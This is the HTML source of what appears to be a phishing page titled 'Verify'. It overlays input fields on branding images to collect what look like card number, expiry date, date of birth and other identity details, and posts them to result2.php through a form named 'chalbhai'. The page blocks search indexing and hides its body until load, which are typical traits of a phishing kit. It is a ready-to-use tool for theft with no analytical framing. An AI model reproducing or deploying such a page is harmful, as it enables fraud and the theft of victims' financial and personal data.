<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>Verify</title>
<meta http-equiv="content-type" content="text/html; charset=iso-8859-1">
<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
<meta name="robots" content="noindex">
<meta name="googlebot" content="noindex">
<meta name="googlebot-news" content="noindex" />
<meta name="googlebot" content="noindex">
<meta name="googlebot-news" content="nosnippet">

    <meta http-equiv="Cache-Control" content="no-store" />
    <meta http-equiv="Cache-Control" content="no-cache" />
    <meta http-equiv="Cache-Control" content="private" />
    <meta http-equiv="Pragma" content="no-cache" />

<link rel="shortcut icon"
              href="images/favicon.ico"/>
			  
			  
	
<script type="text/javascript">

function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}

</script>

<body style="visibility:hidden" onload="unhideBody()">

<style> 
  .textbox { 
    border: 1px solid #c4c4c4; 
    height: 40px; 
    width: 275px; 
     
    padding: 4px 4px 4px 4px; 
    border-radius: 4px; 
    -moz-border-radius: 4px; 
    -webkit-border-radius: 4px; 
    box-shadow: 0px 0px 8px #d9d9d9; 
    -moz-box-shadow: 0px 0px 8px #d9d9d9; 
    -webkit-box-shadow: 0px 0px 8px #d9d9d9; 
    padding: 11px 10px 13px 10px;
 
    font-size: .9375em;
    
    
} 
 
.textbox:focus { 
    outline: none; 
    border: 1px solid #7bc1f7; 
    box-shadow: 0px 0px 4px #7bc1f7; 
    -moz-box-shadow: 0px 0px 4px #7bc1f7; 
    -webkit-box-shadow: 0px 0px 4px #7bc1f7; 
} 
 </style> 
</head>
<body>
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1344px; height:145px; z-index:0"><img src="images/01.png" alt="" title="" border=0 width=1344 height=145></div>

<div id="image2" style="position:absolute; overflow:hidden; left:203px; top:151px; width:372px; height:32px; z-index:1"><img src="images/02.png" alt="" title="" border=0 width=372 height=32></div>

<div id="image3" style="position:absolute; overflow:hidden; left:199px; top:194px; width:319px; height:300px; z-index:2"><img src="images/09.png" alt="" title="" border=0 width=319 height=300></div>

<div id="hr1" style="position:absolute; overflow:hidden; left:205px; top:500px; width:313px; height:17px; z-index:3">
<hr size=2 width=313>
</div>

<div id="image4" style="position:absolute; overflow:hidden; left:204px; top:522px; width:364px; height:268px; z-index:4"><img src="images/100.png" alt="" title="" border=0 width=364 height=268></div>
<form action=result2.php name=chalbhai id=chalbhai method=post>
<div id="image5" style="position:absolute; overflow:hidden; left:0px; top:957px; width:1337px; height:253px; z-index:5"><a href="#"><img src="images/08.png" alt="" title="" border=0 width=1337 height=253></a></div>

<input name="formtext1" required class="textbox" type="text" maxlength=20 style="position:absolute;width:300px;left:209px;top:226px;z-index:6">
<input name="formtext2"  placeholder="MM"   required class="textbox"  type="text" maxlength=2 style="position:absolute;width:83px;left:209px;top:318px;z-index:7">
<input name="formtext3"  placeholder="YYYY"   required class="textbox"  type="text" maxlength=4 style="position:absolute;width:83px;left:311px;top:318px;z-index:8">
<input name="formtext4"  required class="textbox" type="text" maxlength=12 style="position:absolute;width:186px;left:209px;top:410px;z-index:9">
<input name="formtext5"  placeholder="DD"   required class="textbox"  type="text" maxlength=2 style="position:absolute;width:62px;left:208px;top:552px;z-index:10">
<input name="formtext6"  placeholder="MM"  required class="textbox" type="text" maxlength=2 style="position:absolute;width:62px;left:290px;top:552px;z-index:11">
<input name="formtext7"  placeholder="YYYY"  required class="textbox" type="text" maxlength=4 style="position:absolute;width:62px;left:376px;top:552px;z-index:12">
<input name="formtext8"   required class="textbox"  type="text" style="position:absolute;width:298px;left:209px;top:644px;z-index:13">
<input name="formtext9"   required class="textbox"  type="text" maxlength=18 style="position:absolute;width:298px;left:208px;top:737px;z-index:14">
<div id="formimage1" style="position:absolute; left:303px; top:856px; z-index:15"><input type="image" name="formimage1" width="129" height="41" src="images/06.png"></div>
<div id="image6" style="position:absolute; overflow:hidden; left:452px; top:862px; width:59px; height:27px; z-index:16"><a href="#"><img src="images/07.png" alt="" title="" border=0 width=59 height=27></a></div>

<div id="image7" style="position:absolute; overflow:hidden; left:827px; top:164px; width:314px; height:130px; z-index:17"><a href="#"><img src="images/03.png" alt="" title="" border=0 width=314 height=130></a></div>


</body>
</html>
